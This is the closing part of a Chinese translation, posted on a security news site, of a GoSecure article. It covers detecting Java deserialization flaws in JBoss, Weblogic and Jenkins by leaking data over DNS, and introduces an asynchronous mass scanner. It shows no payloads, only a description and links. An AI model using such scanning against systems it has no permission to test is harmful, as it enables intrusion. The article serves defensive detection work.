YaHei&#39;;">演示视频</span></strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们创建了一个异步反序列化漏洞扫描工具“</span><a href="https://github.com/GoSecure/break-fast-serial" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Break Fast Serial</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">”，对DNS Chef也做了一点修改，下面是该工具的简要演示。演示了对单个目标的扫描。DNS泄漏的信息证明了这个服务器存在反序列化漏洞。该工具还支持对多个IP、端口进行扫描。该扫描器将对JBoss，Weblogic和Jenkins易受攻击的版本进行探测。对于如何配置DNS Chef服务器、如何生成载荷，及更多其它详细信息，请阅读</span><a href="https://github.com/GoSecure/break-fast-serial#mass-scan" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参考手册</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，及相应POC代码。</span></p><p style="text-align: center; text-indent: 0em;">&nbsp;<iframe class="iframe_auto_size" src="https://v.qq.com/iframe/player.html?vid=p0387lw6zg0&tiny=0&auto=0" frameborder="0" allowfullscreen=""></iframe></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">结论</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">泄漏到DNS的信息有利于以下三个方面：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1.它可以实现反序列化漏洞的探测。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2.它有利于自动扫描多个主机。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3.即使目标服务器存在严格的防火墙限制，它也能识别出存在的漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们发布了一款异步的</span><a href="https://github.com/GoSecure/break-fast-serial" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">自动扫描器</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，该扫描器能对JBoss，Weblogic和Jenkins易受攻击的版本进行探测。今后，我们会有计划的支持其他服务、框架。我们邀请测试者参与到这个开发过程中，这种更广泛和更快的方法，对防御者早期检测出反序列化漏洞很有帮助。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这篇文章主要关注了“CommonsCollection”载荷，但是我们建立小工具所使用的API也适用于其他载荷。同样的规则也适用于探测其他漏洞，如最近出现了</span><a href="https://struts.apache.org/docs/s2-045.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Struts漏洞</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参考</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><a href="https://frohoff.github.io/appseccali-marshalling-pickles/" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">AppSecCali 2015: Marshalling Pickles</a></p><p style="text-indent: 2em; text-align: left;"><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Blind Java Deserialization</span></a></p><p style="text-indent: 2em; text-align: left;"><a href="https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Blind-Java-Deserialization-Part-II</span></a></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/" target="_blank">原文链接：http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】通过泄露到DNS的信息检测反序列化漏洞（含演示视频） - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3662" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/7x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="12660" user-name="hezi34" href="javascript:;">
+                hezi34            </a>
+                        <span class="comment-time">2017-03-28 11:01:02</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12660">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12660" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">我也翻译了，但不是我想要的</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3662" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
